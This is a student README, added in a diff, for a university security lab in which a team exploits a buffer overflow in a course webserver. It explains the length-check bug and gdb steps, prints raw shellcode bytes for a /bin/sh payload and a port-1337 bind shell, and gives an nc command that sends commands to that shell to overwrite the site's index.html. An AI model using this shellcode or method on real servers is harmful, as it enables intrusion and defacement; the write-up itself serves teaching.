@@ -1,0 +1,51 @@
+This README contains:
+(1) a short explanation of our method of attack; and
+(2) a review of the project as a whole
+
+1. METHOD OF ATTACK:
+
+We did a buffer overflow attack on the remote server that changed the return address for the handle function and made the server
+run our shell code that opens up a port that we can communicate with. We then ran commands that update the www/index.html file
+with different content via this port.
+
+2. REVIEW OF PROJECT:
+
+As described in the project guidelines, there are several stages to completing the project.
+
+a. Find the vulnerability in webserver.c.
+
+The basis of the vulnerability was that the int containing the file name length was converted to byte when checking if len < 100,
+so the file name length only needed to be < 100 (mod 256)! There were a few other (but small) restrictions placed on the
+content/formatting of the request that were easy to meet.
+
+b. Use gdb to identify where the relevant variables are stored in memory.
+
+The key variables we want to locate are “filename” and where the return address is stored. The print statement in the server code helped us with locating “filename”. By sending in requests that look like “abcdefg...ABCDEFG...”, and seeing the address that the program eventually jumped to, we were able to locate where the return address is stored. 
+
+c. Construct a request string that will exploit the vulnerability by overwriting variables stored on the stack.
+
+The *final* shellcode we used was from: http://shell-storm.org/shellcode/files/shellcode-882.php. It binds TCP port 1337. However,
+we initially tested a more basic shellcode, which was a "Hello, world!" example that we had found online, from StackOverflow. This is the shellcode we used locally for this:
+
+\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3"
+
+For the final shellcode locally, we used:
+
+\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80
+
+d. Pwn a local webserver process and send it shell commands to create a new file or modify index.html. This may take many
+attempts (but not prohibitively many) since you cannot be exactly sure where the remote server's stack is located.
+
+Now that we had the shellcode working locally, we tried it on the remote server. We created a python script (generate.py) that
+generated a bunch of shellcodes that we could use, with return address separated by 400 bytes (since we had a bunch of NOPs
+before our "actual" shellcode, we could afford to do this). We initially started at address "ffffffff" but, since we had no luck
+after a few different return addresses, a TA gave us a hint to start at "bfffffff" instead. We did that, and our second shellcode
+from shellcodes.txt worked (since the terminal window "hanged").
+
+We were able to then, like on the local server, send the following command into a new terminal window:
+echo -e 'echo "hacked by team 11!!" > www/index.html' | nc 310test.cs.duke.edu 1337
+which successfully changed the index.html file, upon viewing it on a browser.
+
+Overall, we found the project to be more fun than projects 0 and 1, and easier, too. There was a lot more "guess-and-check"
+in this project, which was different. One thing we felt was that the "material" covered/learned in the project doesn't
+relate a lot to the material covered during lectures, but regardless, it was useful and we learned something new.
